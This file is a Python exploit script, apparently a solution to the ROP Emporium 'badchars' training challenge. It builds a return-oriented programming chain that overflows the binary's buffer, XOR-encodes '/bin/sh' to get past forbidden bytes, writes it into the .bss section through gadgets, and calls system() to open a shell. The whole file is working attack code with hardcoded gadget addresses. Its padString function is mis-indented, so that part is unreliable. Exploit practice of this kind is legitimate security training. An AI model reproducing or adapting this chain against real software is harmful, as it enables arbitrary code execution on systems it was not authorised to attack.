import struct
import pdb

#usage: (python exp_plain.py ; cat) | ./badchars

def stringpacker(addr):

    return str(struct.pack("<Q",addr))


def encodeString(inputString, xorByte):
    inputStringBytes = bytearray(inputString)

    encodedString = ""

    for c in inputStringBytes:
        xorVal = c ^ xorByte
        encodedString += chr(xorVal)
    #pdb.set_trace()
    return encodedString

def padString(inputString, width):
	if len(inputString) % width == 0:
       		inputString += "\x00" * width
    	else:
        	inputString += (width-(len(inputString)%width)) * "\x00"
        return inputString

def getGoodCharacters():
    goodchars = ""
    for i in range(1,256): # we cannot use the \x00 byte, since it is the string delimiter and therefore a *natural* bad character
        char = chr(i)
        if char in badchars:
            continue
        else:
            goodchars += char
    return goodchars

def RopChainHelper(inputString, location):
    payload = ""

    paddedString = padString(inputString,8)
    xorChar = -1
    encodedString = paddedString

    if containsBadCharacters(encodedString) == True:

        goodChars = getGoodCharacters()
        goodCharsList = list(goodChars)

        while containsBadCharacters(encodedString) == True:
            if len(goodCharsList) == 0:
                exit() # we have no more good characters, giving up...

            xorChar = ord(goodCharsList.pop())
            encodedString = encodeString(paddedString,xorChar)
            #pdb.set_trace()
    # we have found a character encoding without bad characters.
    # Save the (encoded) string to memory

    for i in range(0,len(encodedString),8):
        payload += stringpacker(pop_r12_r13)
        payload += encodedString[i:i+8] # will be stored in r12
        payload += stringpacker(location+i) # will be stored in r13
        payload += stringpacker(mov_r13_r12)





    # Decode string, if necessary
    if xorChar != -1:
        for i in range(0,len(encodedString)):
            payload += stringpacker(pop_r14_r15)
            payload += chr(xorChar) * 8 # will be stored in r15, we actually only need the lowest byte
            payload += stringpacker(location+i) # will be stored in r14
            payload += stringpacker(xor_byte_r15)




    return payload


def containsBadCharacters(inputString):
    for c in badchars:
        if c in inputString:
            return True

    return False

crap = "A" * 40
badchars = "bic/ fns"

goodchars = getGoodCharacters()

'''

conversions:
'b' -> 0xeb
'i' -> 0xeb
'c' -> 0xeb
'/' -> 0xeb
' ' -> 0xeb
'f' -> 0xeb
'n' -> 0xeb
's' -> 0xeb

'''

call_system = 0x00000000004006f0 # <system@plt
xor_byte_r15 = 0x0000000000400b30 # usefulGadgets + 0 -- xor BYTE PTR [r15],r14b; ret
mov_r13_r12 = 0x0000000000400b34 # usefulGadgets + 4 -- mov    QWORD PTR [r13+0x0],r12; ret
pop_r12_r13 = 0x0000000000400b3b # usefulGadgets + 11 -- pop r12; pop r13; ret
pop_r14_r15 = 0x0000000000400b40 # usefulGadgets + 16 -- pop r14; pop r15; ret
pop_rdi = 0x0000000000400b39 # usefulGadgets + 9 -- pop rdi; ret
#data_section = 0x601070 # .data section WE cannot use this section since the byte value \x73 = 's' is a bad character
data_section = 0x601000 # .got.plt section
data_section = 0x0000000000601080 #bss section
command = "/bin/sh"
payload = crap

payload += RopChainHelper(command,data_section)


payload += stringpacker(pop_rdi)
payload += stringpacker(data_section)
payload += stringpacker(call_system)

if len(payload) > 512:
    exit("Payload size is limited to 512 bytes, choose a shorter command string!")

print(payload)


